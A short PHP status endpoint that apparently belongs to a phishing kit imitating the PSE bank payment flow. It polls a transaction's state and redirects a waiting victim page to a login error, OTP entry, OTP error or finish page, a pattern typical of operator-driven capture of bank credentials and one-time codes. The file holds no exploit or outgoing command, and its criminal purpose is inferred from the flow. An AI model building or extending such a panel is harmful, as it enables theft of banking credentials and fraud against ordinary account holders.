<?php
include 'db.php';
$config = include 'config.php';

header('Content-Type: application/json');

if (!isset($_GET['id'])) {
    echo json_encode(['status' => 'error', 'message' => 'No ID provided']);
    exit();
}

$id = intval($_GET['id']);
$sql = "SELECT estado FROM pse WHERE id = :id";
$stmt = $conn->prepare($sql);
$stmt->execute(['id' => $id]);
$row = $stmt->fetch();

if ($row) {
    $estado = intval($row['estado']);
    $new_location = '';

    // Define redirects based on state
    switch ($estado) {
        case 2: // Error Login
            $new_location = "error.php?id=" . $id; // Adjust paths relative to cargando.php location
            break;
        case 3: // OTP
            $new_location = "otp.php?id=" . $id;
            break;
        case 4: // OTP Error
            $new_location = "errorotp.php?id=" . $id;
            break;
        case 0: // Finish
            $new_location = "finish.php";
            break;
        // Add other states as needed
    }

    if ($new_location) {
        echo json_encode(['status' => 'success', 'new_location' => $new_location]);
    } else {
        echo json_encode(['status' => 'waiting']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Transaction not found']);
}

// PDO connection closes automatically when variable is destroyed
$stmt = null;
$conn = null;
?>